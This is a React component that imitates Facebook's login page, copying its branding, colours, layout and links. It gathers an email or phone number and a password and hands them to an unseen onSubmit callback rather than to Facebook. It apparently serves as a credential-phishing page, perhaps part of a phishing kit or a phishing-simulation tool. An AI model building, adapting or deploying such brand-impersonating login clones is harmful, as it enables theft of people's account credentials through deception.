'use client'

import { useState } from 'react'

interface FacebookPageProps {
  onSubmit: (data: { email?: string; password?: string }) => void
}

export function FacebookPage({ onSubmit }: FacebookPageProps) {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    await onSubmit({ email, password })
    setLoading(false)
  }

  return (
    <div className="min-h-screen flex" style={{ backgroundColor: '#F0F2F5', fontFamily: 'Helvetica, Arial, sans-serif' }}>
      {/* Left Side - Branding */}
      <div className="hidden md:flex flex-1 flex-col justify-center px-12" style={{ maxWidth: '580px' }}>
        <div className="text-7xl font-bold mb-2" style={{ color: '#1877F2' }}>facebook</div>
        <p className="text-2xl font-normal" style={{ color: '#1C1E21' }}>
          Connect with friends and the world around you on Facebook.
        </p>
      </div>

      {/* Right Side - Login Card */}
      <div className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-[396px]">
          <div className="bg-white rounded-lg shadow-md p-6" style={{ boxShadow: '0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1)' }}>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <input
                  type="text"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="Email or phone number"
                  className="w-full px-4 py-3 text-base border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                  style={{ borderColor: '#DDDFE2' }}
                  required
                />
              </div>
              <div>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  className="w-full px-4 py-3 text-base border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                  style={{ borderColor: '#DDDFE2' }}
                  required
                />
              </div>
              <button
                type="submit"
                disabled={loading}
                className="w-full py-3 text-lg font-bold text-white rounded-lg disabled:opacity-50 disabled:cursor-not-allowed"
                style={{ backgroundColor: '#1877F2' }}
              >
                {loading ? 'Logging in...' : 'Log In'}
              </button>
            </form>

            <div className="mt-4 text-center">
              <a href="#" className="text-sm hover:underline" style={{ color: '#1877F2' }}>
                Forgotten password?
              </a>
            </div>

            <div className="mt-6 pt-6 border-t border-gray-300" style={{ borderColor: '#DADDE1' }}>
              <button
                type="button"
                className="w-full py-3 text-base font-bold text-white rounded-lg"
                style={{ backgroundColor: '#42B72A' }}
              >
                Create new account
              </button>
            </div>
          </div>

          <div className="mt-6 text-center text-sm">
            <p style={{ color: '#1C1E21' }}>
              <a href="#" className="font-semibold hover:underline" style={{ color: '#1C1E21' }}>
                Create a Page
              </a>
              {' '}for a celebrity, brand or business.
            </p>
          </div>
        </div>
      </div>
    </div>
  )
}

